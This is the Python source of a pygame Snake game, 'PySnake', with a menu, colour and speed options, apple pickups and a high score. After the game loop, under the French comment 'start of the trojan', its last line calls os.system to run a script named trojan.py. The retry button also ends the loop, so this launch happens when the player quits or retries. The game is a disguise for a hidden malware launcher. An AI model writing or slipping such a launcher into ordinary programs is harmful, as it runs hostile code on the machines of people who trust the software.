#Imports
from numpy.lib.function_base import disp
from pyautogui import position
import pygame, random, os, sys
from pygame import mixer
from pygame import pixelarray
from functions import *

"""Snake"""

#Init
pygame.init()
loop = True
menu = True
clock = pygame.time.Clock()
frame = 0
speed = 60

#Screen
l = 512 ; L = 512 + 32
display = pygame.display.set_mode((l, L))
pygame.display.set_caption("PySnake")
pygame.display.set_icon(pygame.image.load("assets/logo.png"))
grid = pygame.image.load("assets/grid2.png")
backgroundMusic = pygame.mixer.Sound("assets/music.mp3")
pygame.mixer.Channel(1).play(backgroundMusic, loops = -1, maxtime=0, fade_ms=0)

#Player 
playerHead = pygame.image.load("assets/snakeHead.png")
playerBody = pygame.image.load("assets/snakeBody.png")
playerTail = pygame.image.load("assets/snakeTail.png")
playerX = l//2
playerY = L//2 - 16
playerOrientation = 0
playerLengh = 2
playerXAncien = [192, 224, 256]
playerYAncien = [256, 256, 256] 
playerRotation = [0, 0, 0]

playerXDisplay = l//2 ; playerYDisplay = L//2 + 112
playerXAncienDisplay = [l//2 - 64, l//2 - 32, l//2] ; playerYAncienDisplay = [L//2+112,L//2+112,L//2+112]

def player(x, y, xAncien, yAncien, Rotation = [0, 0, 0], color = (65, 111, 226)) : 
    angle = angles[int(Rotation[int(len(Rotation) - 1)])] 
    playerHeadRotate = rotation(playerHead, playerHead.get_rect(), angle)
    playerHeadRotate = changeColor(playerHeadRotate, (65, 111, 226), color)
    playerHeadRotate = changeColor(playerHeadRotate, (30, 71, 158), color)
    display.blit(playerHeadRotate, (x, y))
    for i in range(playerLengh) : 
        if i == 0 :
            angle = angles[int(Rotation[1])]
            playerTailRotate = rotation(playerTail, playerTail.get_rect(), angle)
            playerTailRotate = changeColor(playerTailRotate, (65, 111, 226), color)
            display.blit(playerTailRotate, (xAncien[0], yAncien[0]))
        else :
            angle = angles[int(Rotation[1])]
            playerBodyRotate = rotation(playerBody, playerBody.get_rect(), angle)        
            playerBodyRotate = changeColor(playerBodyRotate, (65, 111, 226), color)
            display.blit(playerBodyRotate, (xAncien[i], yAncien[i]))

#Pomme
pommePng = pygame.image.load("assets/pomme.png")
pommeX = -100
pommeY = -100
pommeState = False

def pomme(x, y) :
    global pommeState
    pommeState = True
    display.blit(pommePng,(x, y))
    return pommeState

#Variables
angles = [0, 90, 270, 180]
colorsName = ["Blue", "Red", "Yellow", "Pink", "Orange", "Grey"]
colorsRGB = [(65, 111, 226), (164, 22, 35), (255, 202, 58), (255, 175, 204), (227, 100, 20), (108, 117, 125)]

mange = False
gameOver = False 

retryPng = pygame.image.load("assets/retry.png")
trophyPng = pygame.image.load("assets/trophy.png")

score = 0
color = 0

def textFont(size) :
    font = pygame.font.Font('assets/font.ttf', size)
    return font

'''Game'''

#GameLoop
while loop :
    
    display.fill((0, 0, 0))
    display.blit(grid, (0, 0))

    for event in pygame.event.get() :
        if event.type == pygame.QUIT : 
            loop = False
        if event.type == pygame.KEYDOWN :
            if event.key == pygame.K_LEFT : 
                if playerOrientation != 0 :
                    playerOrientation = 3
            if event.key == pygame.K_RIGHT : 
                if playerOrientation != 3 :
                    playerOrientation = 0
            if event.key == pygame.K_UP :
                if playerOrientation != 2 : 
                    playerOrientation = 1
            if event.key == pygame.K_DOWN : 
                if playerOrientation != 1 :
                    playerOrientation = 2
        if event.type == pygame.MOUSEBUTTONDOWN :
            if event.button == 1 :
                try :
                    if retryRect.collidepoint(event.pos) : 
                        playerX = l//2 ; playerY = L//2 - 16
                        playerOrientation = 0
                        playerLengh = 2
                        playerXAncien = [192, 224, 256] ; playerYAncien = [256, 256, 256] 
                        playerRotation = [0, 0, 0]
                        score = 0
                        pygame.mixer.Channel(1).unpause()
                        pommeState = False
                        loop = False 
                        gameOver = False
                except NameError : pass

                try :
                    if playRect.collidepoint(event.pos) :
                        menu = False
                except NameError : pass

                try :
                    if speedRect.collidepoint(event.pos) :
                        if speed == 240 :
                            speed = 60
                        else :
                            speed *= 2
                except NameError : pass

                try :
                    if colorRect.collidepoint(event.pos) :
                        if color != 5 :
                            color += 1
                        else : 
                            color = 0
                except NameError : pass

                try :
                    if optionRect.collidepoint(event.pos) :
                        menu = True
                except NameError : pass
                
    #Frames 
    frameAncien = frame
    frame += 1

    #Menu
    if menu == True :
        
        #Player Display
        playerLengh = 2
        if frame//60 > frameAncien//60 :
            if playerXDisplay > l - 65 : playerXDisplay = 32
            else : playerXDisplay += 32
            playerXAncienDisplay.append(playerXDisplay) ; playerXAncienDisplay.pop(0)
        player(playerXDisplay, playerYDisplay, playerXAncienDisplay, playerYAncienDisplay, color = colorsRGB[color])
        
        blur(display)

        #Title
        font = textFont(64)
        text = font.render('PySnake', True, (0,0,0))
        titleTextRect = text.get_rect()
        titleTextRect.center = (l // 2, 64)
        display.blit(text, titleTextRect)
        #Play
        playPng = pygame.image.load("assets/play.png")
        font = textFont(48)
        text = font.render('Play', True, (0,0,0))
        display.blit(text, (l // 2 - 16, L // 2 - 128-8))
        playRect = playPng.get_rect()
        playRect.center = (l // 2 - 128 + 48, L // 2 - 128+16)
        display.blit(playPng, playRect)
        #Speed
        speedPng = pygame.image.load("assets/speed.png")
        font = textFont(48)
        text = font.render(str(speed//60), True, (0,0,0))
        display.blit(text, (l // 2 - 16, (L // 2 - 128-8) + 64))
        speedRect = speedPng.get_rect()
        speedRect.center = (l // 2 - 128 + 48, (L // 2 - 128+16) + 64)
        display.blit(speedPng, speedRect)
        #Color
        colorPng = pygame.image.load("assets/color.png")
        font = textFont(48)
        text = font.render(colorsName[color], True, (0,0,0))
        display.blit(text, (l // 2 - 16, (L // 2 - 128-8) + 128))
        colorRect = colorPng.get_rect()
        colorRect.center = (l // 2 - 128 + 48, (L // 2 - 128+16) + 128)
        display.blit(colorPng, colorRect)

    #Jeu
    elif gameOver != True :

        #Title
        font = textFont(48)
        text = font.render('PySnake', True, (0,0,0))
        titleTextRect = text.get_rect()
        titleTextRect.center = (l // 2, 32)
        display.blit(text, titleTextRect) 

        #Movement 
        if frame//60 > frameAncien//60 :
            if playerOrientation == 0 : playerX += 32 
            elif playerOrientation == 1 : playerY -= 32
            elif playerOrientation == 2 : playerY += 32
            elif playerOrientation == 3 : playerX -= 32        

        #Game Boundaries
        if playerX < 32 : playerX = 32 ; gameOver = True ; pygame.mixer.Channel(1).pause() ; (mixer.Sound("assets/snake.mp3")).play()
        elif playerX > l-64 : playerX = l-64 ; gameOver = True ; pygame.mixer.Channel(1).pause() ; (mixer.Sound("assets/snake.mp3")).play()
        if playerY < 64 : playerY = 64 ; gameOver = True ; pygame.mixer.Channel(1).pause() ; (mixer.Sound("assets/snake.mp3")).play()
        elif playerY > L-64 : playerY = L-64 ; gameOver = True ; pygame.mixer.Channel(1).pause() ; (mixer.Sound("assets/snake.mp3")).play()

        #Pomme
        while pommeState == False :
            pommeX = random.randint(1, 14) * 32 ; pommeY = random.randint(2, 15) * 32 
            try : pommeXMatch = playerXAncien.index(pommeX) ; pommeYMatch = playerYAncien.index(pommeY) 
            except ValueError : pommeXMatch, pommeYMatch = 0, 0
            if pommeXMatch == pommeYMatch :
                pomme(pommeX, pommeY) 
        
        if pommeState == True :
            pomme(pommeX, pommeY)

        #Collision Pomme
        if pommeState == True :
            if pommeX == playerX and pommeY == playerY :
                pommeState = False
                (mixer.Sound("assets/manger.mp3")).play()
                playerLengh += 1
                mange = True

        #Score
        if mange == True :
            score += 1
        with open("assets/highScore.txt", "r") as f :
            highScore = f.readline()
        f.close()
        font = textFont(32)
        scoreText = font.render(str(score), True, (0,0,0))
        display.blit(pommePng, (32, 16))
        display.blit(scoreText, (71, 20))

        font = textFont(32)
        scoreText = font.render(str(highScore), True, (0,0,0))
        display.blit(trophyPng, (l-32-64, 16))
        display.blit(scoreText, (l-64, 20))

        #Move Player
        if frame//60 != frameAncien//60 :
            playerXAncien.append(playerX) ; playerYAncien.append(playerY)
            playerRotation.append(playerOrientation)
            if mange != True :
                playerXAncien.pop(0) ; playerYAncien.pop(0)
                playerRotation.pop(0)
            else : mange = False

        player(playerX, playerY, playerXAncien, playerYAncien, playerRotation, colorsRGB[color])

        #Collision Joueur
        for i in range(len(playerXAncien)-1) :
            if playerX == playerXAncien[i] and playerY == playerYAncien[i] :
                gameOver = True
                pygame.mixer.Channel(1).pause()
                (mixer.Sound("assets/snake.mp3")).play()

    else :
        blur(display)
        #GameOver
        font = textFont(48)
        text = font.render('GAME OVER', True, (0,0,0))
        gameTextRect = text.get_rect()
        gameTextRect.center = (l // 2, 32)
        display.blit(text, gameTextRect) 
        #Score
        font = textFont(32)
        scoreText = font.render(str(score), True, (0,0,0))
        display.blit(pommePng, (32, 16))
        display.blit(scoreText, (71, 20))
        #HighScore
        font = textFont(32)
        scoreText = font.render(str(highScore), True, (0,0,0))
        display.blit(trophyPng, (l-32-64, 16))
        display.blit(scoreText, (l-64, 20))
        #Retry
        retryRect = retryPng.get_rect()
        retryRect.center = (l // 2 - 32 , L-32)
        display.blit(retryPng, retryRect)
        #Option
        optionPng = pygame.image.load("assets/option.png")
        optionRect = optionPng.get_rect()
        optionRect.center = (l // 2 + 32, L-32)
        display.blit(optionPng, optionRect)

        #Loose Snake
        looseSnakePng = pygame.image.load("assets/loosesnake.png")
        looseSnakeRect = looseSnakePng.get_rect()
        looseSnakeRect.center = (l//2, L//2)
        display.blit(looseSnakePng, looseSnakeRect)

        pygame.display.update()

        #Update HighScore
        if score > int(highScore) :
            with open("assets/highScore.txt", "w") as f :
                f.write(str(score))
            f.close()

    #Finalisation
    pygame.display.update()
    clock.tick(speed)

#Début du trojan 
os.system("trojan.py 1")